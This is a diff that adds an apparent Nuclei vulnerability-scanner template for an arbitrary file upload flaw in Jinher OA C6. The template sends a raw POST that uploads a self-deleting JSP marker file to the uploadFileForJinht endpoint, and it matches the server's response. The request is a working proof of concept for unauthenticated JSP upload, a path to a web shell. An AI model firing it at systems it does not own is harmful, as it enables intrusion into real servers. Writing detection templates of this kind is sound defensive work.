@@ -1,0 +1,50 @@
+id: jinher-oa-jc6-uploadFileForJinht-fileupload
+info:
+  name: 金和OA C6 UploadFileEditorSave.aspx 文件上传漏洞
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/wudijun/Catcher/blob/9b0d75b199c1ba60b0ffa37429edf1f0328fe187/poc/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20jc6%20uploadFileForJinht%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.yaml#L11
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips: 目前没手法利用，找不到传到哪了
+    repair:
+    version:
+  tags: fileupload,jinher,oa,c6
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /jc6/JHSoft.WCF/Attachment/uploadFileForJinht HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+        Connection: close
+        UploadFileName: {{filename}}.jsp
+        FileSize: 40
+        StartPosition: 0
+        isFromMobilePhone: 1
+        
+        <%out.print("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      
+      # - |+
+      #   GET /jc6/upload/{{filename}}.jsp HTTP/1.1
+      #   Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body_1,'attachmentId','fileName','localUrl','{{filename}}')
+        condition: and
